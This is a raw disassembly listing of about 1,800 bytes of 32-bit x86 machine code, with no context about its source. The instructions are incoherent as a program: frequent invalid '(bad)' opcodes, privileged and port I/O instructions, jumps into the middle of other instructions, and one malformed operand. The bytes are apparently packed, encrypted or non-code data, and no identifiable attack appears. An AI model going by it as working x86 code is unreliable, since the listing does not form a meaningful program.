  409f66:	add    BYTE PTR [eax],al
  409f68:	in     al,0xf0
  409f6a:	std    
  409f6b:	inc    edi
  409f6c:	mov    ch,BYTE PTR [edx+0x0]
  409f6f:	lock gs push eax
  409f72:	inc    ecx
  409f73:	or     BYTE PTR [esp+esi*2+0x51],ah
  409f77:	cdq    
  409f78:	or     edi,edi
  409f7a:	xor    eax,0x40457e
  409f7f:	xor    BYTE PTR [esi],bh
  409f81:	sar    bh,1
  409f83:	daa    
  409f84:	push   es
  409f85:	shl    BYTE PTR [esi+ebp*8-0x7e],0x45
  409f8a:	hlt    
  409f8b:	(bad)  
  409f8c:	jle    0x409f81
  409f8e:	(bad)  
  409f8f:	cmp    eax,0xc5b1e804
  409f94:	mov    bh,bh
  409f96:	dec    DWORD PTR ds:0xd501e7f1
  409f9c:	mov    bh,bh
  409f9e:	push   0xffffff88
  409fa0:	arpl   WORD PTR [esi+0x51],bx
  409fa3:	dec    ecx
  409fa4:	or     eax,0x4c299868
  409fa9:	(bad)  
  409faa:	(bad)  
  409fab:	jge    0x409f5e
  409fad:	dec    eax
  409fae:	inc    ecx
  409faf:	mov    bl,ah
  409fb1:	add    eax,edx
  409fb3:	add    bh,al
  409fb5:	mov    BYTE PTR [eax-0x1],dl
  409fb8:	dec    ebp
  409fb9:	add    eax,0x88c5a0e8
  409fbe:	jmp    FWORD PTR [edx+0x48]
  409fc1:	arpl   WORD PTR [ecx+0x51],bp
  409fc4:	or     DWORD PTR ds:0x4c299868,ecx
  409fca:	(bad)  
  409fcb:	(bad)  
  409fcc:	jge    0x409f7f
  409fce:	dec    eax
  409fcf:	inc    ecx
  409fd0:	dec    eax
  409fd1:	jecxz  0x409fb4
  409fd3:	iret   
  409fd4:	(bad)  
  409fd5:	mov    BYTE PTR [ebx],cl
  409fd7:	ror    BYTE PTR [ecx+edx*1],0x89
  409fdb:	inc    ebp
  409fdc:	jl     0x409f67
  409fde:	jne    0x409fd4
  409fe0:	xor    edi,ebx
  409fe2:	cmc    
  409fe3:	pop    es
  409fe4:	or     DWORD PTR [ecx+0x7e],eax
  409fe7:	dec    DWORD PTR [esi]
  409fe9:	shl    ch,1
  409feb:	repz sbb ecx,esi
  409fee:	dec    esi
  409fef:	(bad)  
  409ff0:	dec    BYTE PTR [edx+0x3]
  409ff3:	push   0xffc29156
  409ff8:	push   esi
  409ff9:	xchg   ebp,eax
  409ffa:	rol    BYTE PTR [eax+0x31],cl
  409ffd:	cwde   
  409ffe:	add    eax,0x6ae03100
  40a003:	mov    dl,0xe6
  40a005:	pop    es
  40a006:	adc    BYTE PTR [eax-0x32],0xf5
  40a00a:	or     ch,al
  40a00c:	popa   
  40a00d:	jne    0x40a08e
  40a00f:	dec    DWORD PTR [ebx+0x60]
  40a012:	jmp    0x40a07d
  40a014:	pusha  
  40a015:	mov    eax,ds:0x24006803
  40a01a:	xor    ebp,eax
  40a01c:	dec    DWORD PTR [esi]
  40a01e:	bound  eax,QWORD PTR [ebx]
  40a020:	add    BYTE PTR [ecx-0x69306cb8],dh
  40a026:	inc    edi
  40a027:	or     eax,eax
  40a029:	add    eax,0x7d458c56
  40a02e:	mov    bh,0xf9
  40a030:	repz jle 0x40a068
  40a033:	or     al,0xe8
  40a035:	and    BYTE PTR [ebp+0x156eff7f],ah
  40a03b:	js     0x40a025
  40a03d:	shl    BYTE PTR [ebx+0x5fcbff7f],1
  40a043:	jmp    0x40a0a3
  40a045:	add    BYTE PTR [ecx],ah
  40a047:	add    al,0x68
  40a049:	test   eax,0xceffc511
  40a04e:	popa   
  40a04f:	add    eax,DWORD PTR [eax]
  40a051:	mov    cl,0x88
  40a053:	jecxz  0x40a023
  40a055:	ss out 0xd3,eax
  40a058:	(bad)  
  40a059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a05a:	or     ecx,esi
  40a05c:	imul   esi,DWORD PTR [eax],0x74
  40a05f:	pop    esi
  40a060:	jg     0x409fed
  40a062:	or     ecx,eax
  40a064:	jmp    0xec2968ea
  40a069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a06a:	xlat   BYTE PTR ds:[ebx]
  40a06b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a06c:	add    ebx,DWORD PTR [ecx-0x4efc16f5]
  40a072:	pusha  
  40a073:	lods   eax,DWORD PTR ds:[esi]
  40a074:	dec    esi
  40a075:	div    BYTE PTR [ebp-0x1e]
  40a078:	inc    ebx
  40a079:	gs pop ds
  40a07b:	jo     0x40a046
  40a07d:	add    dl,ah
  40a07f:	jne    0x40a015
  40a081:	ja     0x40a061
  40a083:	sti    
  40a084:	loopne 0x40a0f1
  40a086:	repz je 0x40a097
  40a089:	jg     0x40a059
  40a08b:	sti    
  40a08c:	cld    
  40a08d:	imul   esp,DWORD PTR [ebx],0x45
  40a090:	(bad)  
  40a091:	jle    0x40a051
  40a093:	sti    
  40a094:	hlt    
  40a095:	jle    0x40a0d3
  40a097:	add    DWORD PTR [ecx],eax
  40a099:	mov    DWORD PTR [eax+0x75],edi
  40a09c:	out    0x4c,al
  40a09e:	jae    0x40a0ac
  40a0a0:	jmp    0x41a54c7d
  40a0a5:	add    al,0x31
  40a0a7:	data16 (bad) 
  40a0a9:	jle    0x40a0af
  40a0ab:	add    eax,0x612ef8c6
  40a0b0:	mov    esp,0xa0757e74
  40a0b5:	inc    ecx
  40a0b6:	sub    DWORD PTR [ecx],ecx
  40a0b8:	adc    al,0x8b
  40a0ba:	pop    ebp
  40a0bb:	xchg   DWORD PTR [ebp-0x618a9849],ebp
  40a0c1:	inc    esi
  40a0c2:	mov    ah,0xb0
  40a0c4:	xchg   edi,eax
  40a0c5:	jle    0x40a11d
  40a0c7:	or     cl,ch
  40a0c9:	add    esi,DWORD PTR [ecx]
  40a0cb:	sub    BYTE PTR [eax+edx*1],0x3a
  40a0cf:	dec    ecx
  40a0d0:	cmc    
  40a0d1:	or     BYTE PTR [ecx+0x39e90030],dh
  40a0d7:	or     al,0xe9
  40a0d9:	adc    BYTE PTR [ecx+ecx*1],dh
  40a0dc:	add    BYTE PTR [esi+0x29],ah
  40a0df:	add    eax,ebp
  40a0e1:	stc    
  40a0e2:	add    BYTE PTR [edi+0x72e2ff74],al
  40a0e8:	dec    BYTE PTR [esi]
  40a0ea:	shl    DWORD PTR [esp+eax*8+0x40],0xe9
  40a0ef:	xchg   esi,edi
  40a0f1:	or     edx,DWORD PTR [ecx-0x14]
  40a0f4:	inc    ebx
  40a0f5:	push   DWORD PTR [esi]
  40a0f7:	mov    eax,DWORD PTR [esi]
  40a0f9:	push   0xffc9ff12
  40a0fe:	and    eax,0xdee800e9
  40a103:	outs   dx,DWORD PTR ds:[esi]
  40a104:	je     0x40a105
  40a106:	pusha  
  40a107:	test   eax,0x4f0efeb1
  40a10c:	loope  0x40a14b
  40a10e:	call   0x64cdaa45
  40a113:	jo     0x40a188
  40a115:	push   esi
  40a117:	jecxz  0x40a185
  40a119:	mov    bh,0x22
  40a11b:	das    
  40a11c:	je     0x40a0ab
  40a11e:	ins    BYTE PTR es:[edi],dx
  40a11f:	repz jb 0x40a121
  40a122:	fiadd  WORD PTR [ebp+0x1791b573]
  40a128:	je     0x40a129
  40a12a:	rcr    DWORD PTR [edx],0xbb
  40a12d:	add    cl,ch
  40a12f:	mov    ebx,0xfcbfbc8e
  40a134:	jae    0x40a176
  40a136:	out    0xae,al
  40a138:	jo     0x40a13a
  40a13a:	jmp    0xabd62771
  40a13f:	out    0x73,eax
  40a141:	call   DWORD PTR [esi-0x16ffe6cd]
  40a147:	add    BYTE PTR [edx],dh
  40a149:	std    
  40a14a:	fs pop esp
  40a14c:	jae    0x40a16e
  40a14e:	push   eax
  40a14f:	add    BYTE PTR [eax],ah
  40a151:	fmul   DWORD PTR [esi+0x41]
  40a154:	dec    eax
  40a155:	loopne 0x40a11c
  40a157:	mov    dh,0x48
  40a159:	or     BYTE PTR [ebx],cl
  40a15b:	shl    BYTE PTR ds:0x18b1e90b,0x8
  40a162:	add    BYTE PTR [ebp-0x2385b],cl
  40a168:	jg     0x40a0ee
  40a16a:	inc    edx
  40a16b:	sub    al,0xc8
  40a16d:	pop    edi
  40a16e:	ror    BYTE PTR [edi-0x27],cl
  40a171:	pop    es
  40a172:	call   0x4e2820
  40a177:	or     ecx,DWORD PTR [eax+0x7c]
  40a17a:	add    al,0xe9
  40a17c:	test   BYTE PTR ds:0x99c00000,cl
  40a182:	dec    eax
  40a183:	inc    ecx
  40a184:	enter  0x74f4,0xc
  40a188:	xor    BYTE PTR [edi-0x7bc00032],ch
  40a18e:	xchg   ebp,eax
  40a18f:	ret    0xf62e
  40a192:	dec    BYTE PTR [ebp+0x5052239a]
  40a198:	xor    bl,dh
  40a19a:	int    0xff
  40a19c:	lahf   
  40a19d:	push   edi
  40a19e:	(bad)  
  40a19f:	jne    0x40a149
  40a1a1:	push   edi
  40a1a2:	(bad)  
  40a1a3:	jne    0x40a145
  40a1a5:	fist   WORD PTR [ecx]
  40a1a7:	(bad)  
  40a1a8:	jg     0x40a19e
  40a1aa:	out    0xf9,eax
  40a1ac:	add    dl,dl
  40a1ae:	hlt    
  40a1af:	(bad)  
  40a1b0:	jmp    0x40a1ad
  40a1b2:	add    DWORD PTR [edx+0x2c],0x1
  40a1b6:	mov    esi,DWORD PTR [esi+edi*8-0x1b980b41]
  40a1bd:	dec    ecx
  40a1be:	dec    eax
  40a1bf:	(bad)  
  40a1c0:	inc    BYTE PTR ds:0xbffffebc
  40a1c6:	fist   WORD PTR [ecx-0x49]
  40a1c9:	xor    DWORD PTR [edx+0x3],esp
  40a1cc:	or     esi,DWORD PTR [ecx+0x1d]
  40a1cf:	(bad)  
  40a1d0:	addr16 mov ds:0xc339,eax
  40a1d4:	(bad)  
  40a1d5:	aas    
  40a1d6:	jl     0x40a1e7
  40a1d8:	call   0xffbd4da2
  40a1dd:	cs ds mov bh,0xfe
  40a1e1:	es in  al,dx
  40a1e3:	shl    bh,cl
  40a1e5:	in     eax,0x22
  40a1e7:	jl     0x40a1e8
  40a1e9:	xor    DWORD PTR [eax+0x60217d80],0x1f990cf7
  40a1f3:	rol    BYTE PTR [eax+0x31],cl
  40a1f6:	nop
  40a1f7:	imul   esp,DWORD PTR [edx],0xffffffbe
  40a1fa:	pusha  
  40a1fb:	add    ebp,ebx
  40a1fd:	xor    al,0xf8
  40a1ff:	add    DWORD PTR [eax],eax
  40a201:	xor    DWORD PTR [eax-0x27],esp
  40a204:	or     dh,cl
  40a206:	pushf  
  40a207:	or     dl,BYTE PTR [edx-0x2a]
  40a20a:	xchg   ebp,eax
  40a20b:	or     ebp,eax
  40a20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a20e:	add    bh,BYTE PTR [edi+edi*8+0x0]
  40a212:	(bad)  
  40a214:	dec    eax
  40a215:	(bad)  
  40a216:	mov    esi,0xb7c285e5
  40a21b:	jnp    0x40a298
  40a21d:	push   eax
  40a21e:	scas   al,BYTE PTR es:[edi]
  40a21f:	cmp    eax,0x6ba6febf
  40a224:	ins    BYTE PTR es:[edi],dx
  40a225:	add    bh,ah
  40a227:	pusha  
  40a228:	add    eax,DWORD PTR [ebp+0x10806b71]
  40a22e:	mov    es,WORD PTR [ebx+0x7b]
  40a231:	(bad)  
  40a232:	mov    esp,0x7eff7a8c
  40a237:	pop    eax
  40a238:	ja     0x40a1ef
  40a23a:	xor    DWORD PTR [eax+0x7a],esp
  40a23d:	mov    ch,0xa9
  40a23f:	mov    ds:0x959ff7b,al
  40a244:	or     eax,0xb0725e4e
  40a249:	inc    esi
  40a24a:	and    eax,0x5d8f3c09
  40a24f:	xchg   BYTE PTR [ebp-0x7b339188],ah
  40a255:	add    al,0x31
  40a257:	or     ecx,ebp
  40a259:	jp     0x40a217
  40a25b:	add    al,0x81
  40a25d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a25e:	push   DWORD PTR [ecx+0x6e]
  40a261:	psllw  mm7,mm4
  40a264:	add    cl,BYTE PTR [ebp-0xea18a8c]
  40a26a:	es jb  0x40a249
  40a26d:	ja     0x40a288
  40a26f:	push   ecx
  40a270:	sbb    al,0x7b
  40a272:	push   es
  40a273:	fld    DWORD PTR [ebp-0xf]
  40a276:	add    dl,bh
  40a278:	pusha  
  40a279:	stc    
  40a27a:	dec    ebp
  40a27b:	div    BYTE PTR [ecx+0x66]
  40a27e:	shr    edx,0xde
  40a281:	out    0x7a,eax
  40a283:	pop    esp
  40a284:	jne    0x40a2ac
  40a286:	icebp  
  40a287:	ss popa 
  40a289:	aad    0x79
  40a28b:	(bad)  
  40a28c:	jno    0x40a2a4
  40a28e:	icebp  
  40a28f:	retf   0xf160
  40a292:	dec    ebp
  40a293:	(bad)  
  40a294:	jno    0x40a2c6
  40a296:	inc    esi
  40a297:	sub    eax,0xc58e9409
  40a29c:	xchg   DWORD PTR ds:0xee71af74,ebp
  40a2a2:	in     eax,dx
  40a2a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2a4:	fucomip st,st(1)
  40a2a6:	jp     0x40a2cc
  40a2a8:	add    ecx,edx
  40a2aa:	xor    ch,BYTE PTR [esi+0x71]
  40a2ad:	(bad)  
  40a2ae:	mov    esp,?
  40a2b0:	je     0x40a2f3
  40a2b2:	add    BYTE PTR [eax],dh
  40a2b4:	or     ecx,ebp
  40a2b6:	mov    BYTE PTR [ecx+edi*2-0x27898541],dh
  40a2bd:	inc    eax
  40a2bf:	mov    ecx,0x37e900bb
  40a2c4:	dec    ecx
  40a2c5:	(bad)  
  40a2c7:	xchg   edi,eax
  40a2c8:	or     BYTE PTR [eax],al
  40a2ca:	jmp    0xe941afe8
  40a2cf:	xor    al,BYTE PTR [edx]
  40a2d1:	xchg   DWORD PTR [ecx+0x32],esi
  40a2d4:	or     DWORD PTR [eax],eax
  40a2d6:	adc    esi,ebx
  40a2d8:	xlat   BYTE PTR ds:[ebx]
  40a2d9:	inc    eax
  40a2da:	jmp    0xf7cc4bdf
  40a2df:	ja     0x40a28c
  40a2e1:	jo     0x40a333
  40a2e3:	adc    DWORD PTR [eax],0xad66ff3e
  40a2e9:	xchg   al,dh
  40a2eb:	pop    edi
  40a2ec:	fwait
  40a2ed:	jo     0x40a2ee
  40a2ef:	pushf  
  40a2f0:	sub    BYTE PTR [edi-0x1],0x4e
  40a2f4:	sbb    cl,BYTE PTR ds:0x7e32e901
  40a2fa:	test   DWORD PTR [esi],esi
  40a2fc:	js     0x40a36e
  40a2fe:	call   FWORD PTR [ecx-0x57b76326]
  40a304:	xor    ah,cl
  40a306:	out    dx,eax
  40a307:	mov    eax,0x106770f5
  40a30c:	std    
  40a30d:	leave  
  40a30e:	inc    DWORD PTR [eax]
  40a310:	div    DWORD PTR [ebp+0x4937e900]
  40a316:	je     0x40a2f0
  40a318:	int3   
  40a319:	jo     0x40a2a7
  40a31b:	fs inc ebx
  40a31d:	outs   dx,DWORD PTR ds:[esi]
  40a31e:	push   esi
  40a320:	sub    DWORD PTR [edi+0x75],0xffffffe1
  40a324:	sbb    dl,BYTE PTR [ebx+0x7018e6fd]
  40a32a:	mov    ch,0xd9
  40a32c:	sbb    esi,DWORD PTR [eax-0x1]
  40a32f:	inc    ecx
  40a330:	xor    DWORD PTR [edx],ecx
  40a332:	add    cl,ch
  40a334:	scas   eax,DWORD PTR es:[edi]
  40a335:	xchg   bh,dh
  40a337:	add    BYTE PTR [esi-0xe],dh
  40a33a:	(bad)  
  40a33b:	push   eax
  40a33c:	loopne 0x40a2d6
  40a33e:	dec    eax
  40a33f:	inc    ecx
  40a340:	add    BYTE PTR [eax+0x64],bl
  40a343:	repz push ecx
  40a345:	sbb    DWORD PTR ds:0x4c19e968,eax
  40a34b:	jmp    edi
  40a34d:	pusha  
  40a34e:	lahf   
  40a34f:	add    BYTE PTR [eax],al
  40a351:	push   ebx
  40a352:	int3   
  40a353:	jae    0x40a366
  40a355:	xor    al,BYTE PTR ds:0xf2bf858d
  40a35b:	(bad)  
  40a35c:	call   FWORD PTR [eax]
  40a35e:	bnd je 0x40a369
  40a361:	mov    al,0x51
  40a363:	cld    
  40a364:	call   DWORD PTR [edi-0x690f4b0e]
  40a36a:	repnz (bad) 
  40a36c:	call   0x3f6639
  40a371:	repnz sbb al,0xe8
  40a374:	xchg   ecx,eax
  40a375:	and    eax,0x480bfef2
  40a37a:	jns    0x40a397
  40a37c:	push   0x405c42
  40a381:	enter  0x1ce3,0xcd
  40a385:	pop    ss
  40a386:	repnz dec edi
  40a388:	push   0xffffffc8
  40a38a:	pop    ebx
  40a38b:	(bad)  
  40a38c:	jne    0x40a36e
  40a38e:	jecxz  0x40a3c1
  40a390:	std    
  40a391:	daa    
  40a392:	repnz out 0x19,eax
  40a395:	adc    edx,esi
  40a397:	(bad)  
  40a398:	push   0x405c71
  40a39d:	mov    ds:0x9075ff0d,al
  40a3a2:	jecxz  0x40a34d
  40a3a4:	inc    BYTE PTR [eax]
  40a3a6:	xchg   edi,eax
  40a3a7:	lock addr16 mov ecx,0x69ff4c59
  40a3ae:	sub    esi,edx
  40a3b0:	je     0x40a3ba
  40a3b2:	xor    DWORD PTR [edx-0x64],ecx
  40a3b5:	inc    BYTE PTR [esi-0x1f4714c2]
  40a3bb:	and    BYTE PTR [edx+ebp*2],al
  40a3be:	adc    eax,0x5907eeaf
  40a3c3:	in     eax,0x78
  40a3c5:	jmp    DWORD PTR [esi-0x62]
  40a3c8:	out    dx,al
  40a3c9:	sti    
  40a3ca:	pop    esi
  40a3cb:	or     al,0xc
  40a3cd:	call   0xffb94bc8
  40a3d2:	js     0x40a377
  40a3d4:	(bad)  
  40a3d5:	(bad)  
  40a3d6:	fucomp st(2)
  40a3d8:	pushw  0x6231
  40a3dc:	push   0x77436be
  40a3e1:	jmp    DWORD PTR [eax+ebp*2-0x1fe82895]
  40a3e8:	ja     0x40a3b3
  40a3ea:	repz js 0x40a3f0
  40a3ed:	push   ebp
  40a3ee:	stos   BYTE PTR es:[edi],al
  40a3ef:	mov    esp,0x2009c483
  40a3f4:	mov    esi,0x36031fb
  40a3f9:	add    BYTE PTR [ebp+ebx*4+0x63895077],ch
  40a400:	aad    0x40
  40a402:	xor    DWORD PTR [edi],esi
  40a404:	out    dx,al
  40a405:	or     esp,esi
  40a407:	jne    0x40a3ba
  40a409:	dec    eax
  40a40a:	add    BYTE PTR [eax+0x60],dh
  40a40d:	imul   edi,DWORD PTR [edx+0xb780fea],0xfffffff1
  40a414:	mov    WORD PTR [ecx],ds
  40a416:	mov    DWORD PTR [eax+ebx*1-0x15],ebp
  40a41a:	add    BYTE PTR [ecx],dh
  40a41c:	pop    ss
  40a41d:	mov    ecx,0x776c3cff
  40a422:	jne    0x40a3cd
  40a424:	ja     0x40a413
  40a426:	pop    es
  40a427:	cdq    
  40a428:	mov    al,ds:0x99eff69
  40a42d:	out    0xf1,al
  40a42f:	sahf   
  40a430:	popa   
  40a431:	imul   ecx,DWORD PTR [esi+ecx*4+0x6e],0x93942a0
  40a439:	xor    al,0x8b
  40a43b:	lea    ecx,[eax+0x6e77b0ad]
  40a441:	mov    esi,0xb7b1b43f
  40a446:	ja     0x40a4ae
  40a448:	or     ecx,ebp
  40a44a:	add    esi,DWORD PTR [ecx]
  40a44c:	sub    BYTE PTR [eax+ecx*1],0x2a
  40a450:	dec    ecx
  40a451:	adc    eax,0xe931b101
  40a456:	lock sub eax,0x3104e560
  40a45c:	or     DWORD PTR [esi-0xb91d90f],eax
  40a462:	pop    es
  40a463:	sbb    DWORD PTR [ebp-0x5e],ebx
  40a466:	ja     0x40a48e
  40a468:	fstp   DWORD PTR [eax]
  40a46a:	ja     0x40a410
  40a46c:	add    DWORD PTR [ecx-0x22],edx
  40a46f:	add    BYTE PTR [edi],dl
  40a471:	outs   dx,BYTE PTR ds:[esi]
  40a472:	pop    esi
  40a473:	ins    BYTE PTR es:[edi],dx
  40a474:	dec    edi
  40a475:	inc    ecx
  40a476:	push   esi
  40a477:	ja     0x40a412
  40a479:	push   edi
  40a47a:	sahf   
  40a47b:	(bad)  
  40a47c:	(bad)  
  40a47d:	outs   dx,BYTE PTR ds:[esi]
  40a47e:	mov    esp,0x32590907
  40a483:	ja     0x40a473
  40a485:	jg     0x40a4f3
  40a487:	mov    esp,0xec2e6de7
  40a48c:	sbb    al,0x8
  40a48e:	jmp    0x2bc44896
  40a493:	jbe    0x40a463
  40a495:	ins    DWORD PTR es:[edi],dx
  40a496:	mov    ecx,0xe41796b
  40a49b:	ja     0x40a449
  40a49d:	sub    DWORD PTR [ebx],0x76
  40a4a0:	mov    dh,0x6d
  40a4a2:	cdq    
  40a4a3:	jbe    0x40a489
  40a4a5:	mov    al,0x0
  40a4a7:	neg    DWORD PTR [edi]
  40a4a9:	outs   dx,BYTE PTR ds:[esi]
  40a4aa:	call   0x498822
  40a4af:	jo     0x40a462
  40a4b1:	lods   al,BYTE PTR ds:[esi]
  40a4b2:	(bad)  
  40a4b3:	fiadd  WORD PTR [edi]
  40a4b5:	leave  
  40a4b6:	push   cs
  40a4b7:	ins    DWORD PTR es:[edi],dx
  40a4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4b9:	or     BYTE PTR [eax],al
  40a4bb:	jmp    0xc8033869
  40a4c0:	jmp    FWORD PTR [ebp-0x9]
  40a4c3:	jmp    0x40a507
  40a4c5:	or     DWORD PTR [eax],eax
  40a4c7:	jmp    0x54cd9e22
  40a4cc:	lock outs dx,BYTE PTR ds:[esi]
  40a4ce:	jmp    DWORD PTR [esi+0x392bcaa9]
  40a4d4:	add    BYTE PTR [ebp+0x58],bl
  40a4d7:	dec    edi
  40a4d8:	sub    BYTE PTR ds:0x325a5161,ch
  40a4de:	or     DWORD PTR [ebx],ecx
  40a4e0:	test   eax,0x23eb0741
  40a4e5:	mov    eax,0x9f77c296
  40a4ea:	ins    BYTE PTR es:[edi],dx
  40a4eb:	lea    ebp,[ebx]
  40a4ed:	dec    ecx
  40a4ee:	fldenv [edi+0x3a]
  40a4f1:	out    dx,eax
  40a4f2:	leave  
  40a4f3:	call   DWORD PTR [eax+0x5f]
  40a4f6:	mov    eax,0x493be900
  40a4fb:	jne    0x40a4e8
  40a4fd:	mov    ecx,ecx
  40a4ff:	mov    WORD PTR [eax+esi*2+0x6b],ds
  40a503:	(bad)  
  40a504:	ds mov ecx,0xb1602bc7
  40a50a:	mov    ch,0xfe
  40a50c:	cs addr16 loope 0x40a4a1
  40a510:	mov    cl,0xed
  40a512:	ins    BYTE PTR es:[edi],dx
  40a513:	(bad)  
  40a514:	xchg   esp,eax
  40a515:	ss popa 
  40a517:	cmp    al,0x22
  40a519:	aas    
  40a51a:	ins    BYTE PTR es:[edi],dx
  40a51b:	call   DWORD PTR [esi+ecx*4+0x6b]
  40a51f:	inc    DWORD PTR [eax]
  40a521:	das    
  40a522:	pop    eax
  40a523:	out    0x84,eax
  40a525:	arpl   bx,si
  40a527:	(bad)  
  40a528:	jmp    DWORD PTR ds:0x23e85018
  40a52e:	mov    edi,0x5558fffe
  40a533:	(bad)  
  40a534:	jne    0x40a4b6
  40a536:	loopne 0x40a4d8
  40a538:	inc    BYTE PTR [eax]
  40a53a:	pop    edi
  40a53b:	mul    bh
  40a53d:	jns    0x40a516
  40a53f:	idiv   dh
  40a541:	lea    eax,ds:0xaffffdc7
  40a547:	push   ebp
  40a548:	(bad)  
  40a549:	mov    ch,0xdc
  40a54b:	repnz (bad) 
  40a54d:	push   DWORD PTR [eax-0x34]
  40a550:	mov    cl,0x0
  40a552:	dec    eax
  40a553:	jmp    0x40a514
  40a555:	pmullw mm5,QWORD PTR [eax-0x2]
  40a559:	call   FWORD PTR [edi-0x51434b0a]
  40a55f:	idiv   dh
  40a561:	call   0x415cf6
  40a566:	scas   eax,DWORD PTR es:[edi]
  40a567:	pushf  
  40a568:	mov    eax,0xe7f69ffe
  40a56d:	dec    ecx
  40a56e:	xlat   BYTE PTR ds:[ebx]
  40a56f:	cmc    
  40a570:	dec    cl
  40a572:	dec    edx
  40a573:	add    DWORD PTR [eax],eax
  40a575:	push   ebp
  40a576:	and    ecx,0xffffff82
  40a579:	les    ebx,FWORD PTR [esi+esi*8+0x74]
  40a57d:	or     al,0x70
  40a57f:	xchg   bl,cl
  40a581:	jmp    FWORD PTR [edi-0x80]
  40a584:	inc    ebp
  40a585:	cld    
  40a586:	jecxz  0x40a54f
  40a588:	push   cs
  40a589:	test   BYTE PTR [ebp+eax*1+0x0],cl
  40a58d:	add    al,dh
  40a58f:	cs push ebx
  40a591:	inc    ecx
  40a592:	enter  0x74f4,0xfc
  40a596:	and    BYTE PTR [ebx+0x1331ffca],dh
  40a59c:	aam    0x67
  40a59e:	add    BYTE PTR [ebx+0x66ffc2ae],ch
  40a5a4:	add    ebp,edi
  40a5a6:	pop    es
  40a5a7:	cdq    
  40a5a8:	aad    0x75
  40a5aa:	jmp    DWORD PTR [esi-0x6138f6f7]
  40a5b0:	pop    edx
  40a5b1:	jmp    0x40a600
  40a5b3:	add    ah,BYTE PTR [ecx]
  40a5b5:	add    al,0xff
  40a5b7:	add    al,0x4e
  40a5b9:	imul   ebx,DWORD PTR [ebp+0x5074527b],0x9
  40a5c0:	call   0x1271e694
  40a5c5:	jne    0x40a63c
  40a5c7:	cmp    DWORD PTR [edx-0x10],ebx
  40a5ca:	std    
  40a5cb:	data16 mov dl,0x6b
  40a5ce:	jmp    0x2ece:0x68749a77
  40a5d5:	ret    
  40a5d6:	dec    DWORD PTR [edi+0x14]
  40a5d9:	js     0x40a5c3
  40a5db:	lds    esp,FWORD PTR [edi+0x9e1ff74]
  40a5e1:	mov    dl,BYTE PTR [ebx-0x10]
  40a5e4:	popa   
  40a5e5:	sar    esi,cl
  40a5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5e8:	js     0x40a655
  40a5ea:	push   edx
  40a5eb:	daa    
  40a5ec:	hlt    
  40a5ed:	jae    0x40a5d7
  40a5ef:	call   0x8a401a96
  40a5f4:	loope  0x40a5c5
  40a5f6:	inc    eax
  40a5f7:	xor    ebx,ecx
  40a5f9:	in     eax,dx
  40a5fa:	sti    
  40a5fb:	sbb    DWORD PTR [eax-0x4f0100b7],edi
  40a601:	jmp    0x40a58c
  40a603:	add    BYTE PTR [edx-0x5f],ah
  40a606:	add    edx,DWORD PTR [eax-0x12]
  40a609:	mov    ch,0xb
  40a60b:	call   0xffb4d830
  40a610:	leave  
  40a611:	mov    BYTE PTR ds:0x2609d6ff,bh
  40a617:	out    dx,al
  40a618:	retf   0x4961
  40a61b:	cmp    eax,0x41206ac6
  40a620:	sub    DWORD PTR [ecx],ecx
  40a622:	mov    ah,0x88
  40a624:	lds    eax,FWORD PTR [esi-0x20f988d3]
  40a62a:	call   0x7caad918
  40a62f:	or     ecx,DWORD PTR [ecx-0x698bd5b8]
  40a635:	sub    BYTE PTR [eax+esi*2],0xba
  40a639:	sub    al,0x23
  40a63b:	mov    esp,0x336908f1
  40a640:	xor    ebp,esi
  40a642:	adc    esp,ebx
  40a644:	jnp    0x40a61e
  40a646:	daa    
  40a647:	add    al,0x6
  40a649:	popa   
  40a64a:	lds    esi,FWORD PTR [esi+0x43e20931]
  40a650:	in     eax,0xa
  40a652:	push   ss
  40a653:	pop    esp
  40a654:	sbb    DWORD PTR [ecx-0x5a],ebx
  40a657:	jae    0x40a693
  40a659:	dec    ecx
  40a65a:	adc    eax,0x62e0e118
  40a65f:	xlat   BYTE PTR ds:[ebx]
  40a660:	icebp  
  40a661:	or     BYTE PTR [ecx],bh
  40a663:	jae    0x40a621
  40a665:	add    BYTE PTR [ecx+0x6a2c005b],dl
  40a66b:	jle    0x40a6c9
  40a66d:	ja     0x40a6b2
  40a66f:	jbe    0x40a6e4
  40a671:	sbb    eax,0x16ada936
  40a676:	push   0x66
  40a678:	jae    0x40a67d
  40a67a:	fwait
  40a67b:	and    DWORD PTR [ebx],ecx
  40a67d:	jl     0x40a6c3
  40a67f:	ret    
  40a680:	or     eax,0x5be0f3fe
  40a685:	add    BYTE PTR [ebx+0x46],ch
  40a688:	jae    0x40a6e5
  40a68a:	es ds stc 
  40a68d:	cs popa 
  40a68f:	add    BYTE PTR [esi+0x63],cl
  40a692:	push   0xffffffff
  40a694:	ret    
  40a695:	es push 0x75
  40a698:	icebp  
  40a699:	push   0x4c
  40a69b:	(bad)  
  40a69c:	push   ds
  40a69d:	inc    edx
  40a69e:	fbld   TBYTE PTR ds:0xe801b816
  40a6a4:	cmp    al,BYTE PTR [ebx+0x6a]
  40a6a7:	call   DWORD PTR [ecx-0x16bf28cf]
  40a6ad:	and    esi,esp
  40a6af:	pop    es
  40a6b0:	add    DWORD PTR [eax+0x6c],ebp
  40a6b3:	(bad)  
  40a6b4:	out    dx,al
  40a6b5:	jp     0x40a6e5
  40a6b7:	push   edx
  40a6b8:	sub    BYTE PTR ds:0xeaf1756a,dh
  40a6be:	xor    ch,bh
  40a6c0:	(bad)  
  40a6c1:	add    esp,ecx
  40a6c3:	jo     0x40a700
  40a6c5:	ins    BYTE PTR es:[edi],dx
  40a6c6:	imul   edi,esi,0x2b616d3c
  40a6cc:	mov    esp,0x6869e300
  40a6d1:	push   esi
  40a6d2:	test   al,cl
  40a6d4:	jmp    FWORD PTR [ebp+0x7e80159]
  40a6da:	shr    BYTE PTR [ecx-0x1],0x11
  40a6de:	call   0xc429e7b9
  40a6e3:	repz pop es
  40a6e5:	sbb    DWORD PTR ds:0xa86ff6c,0x2d28530c
  40a6ef:	push   0xd7ae175
  40a6f4:	std    
  40a6f5:	outs   dx,BYTE PTR ds:[esi]
  40a6f6:	mov    ds:0x83657568,eax
